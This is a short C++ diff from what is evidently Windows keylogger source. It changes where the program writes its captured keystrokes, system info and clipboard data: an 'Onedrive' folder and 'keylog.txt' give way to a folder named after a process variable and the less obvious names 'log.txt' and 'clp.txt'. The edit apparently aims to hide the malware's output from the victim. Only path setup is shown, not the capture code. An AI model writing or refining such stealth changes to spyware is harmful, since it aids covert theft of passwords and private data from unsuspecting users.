@@ -61,10 +61,10 @@ int main()
     char infoPath[MY_MAX_PATH] = {0};
     char clipboardFilePath[MY_MAX_PATH] = {0};
 
-    snprintf(dirPath, MAX_PATH, "%s\\Onedrive", userProfilePath);
-    snprintf(location, MY_MAX_PATH, "%s\\Onedrive\\keylog.txt", userProfilePath);
-    snprintf(infoPath, MY_MAX_PATH, "%s\\Onedrive\\info.txt", userProfilePath);
-    snprintf(clipboardFilePath, MY_MAX_PATH, "%s\\Onedrive\\clipboard.txt", userProfilePath);
+    snprintf(dirPath, MAX_PATH, "%s\\%s", userProfilePath, processName);
+    snprintf(location, MY_MAX_PATH, "%s\\%s\\log.txt", userProfilePath, processName);
+    snprintf(infoPath, MY_MAX_PATH, "%s\\%s\\info.txt", userProfilePath, processName);
+    snprintf(clipboardFilePath, MY_MAX_PATH, "%s\\%s\\clp.txt", userProfilePath, processName);
 
     std::wstring wlocation;
     int len = MultiByteToWideChar(CP_ACP, 0, location, -1, NULL, 0);
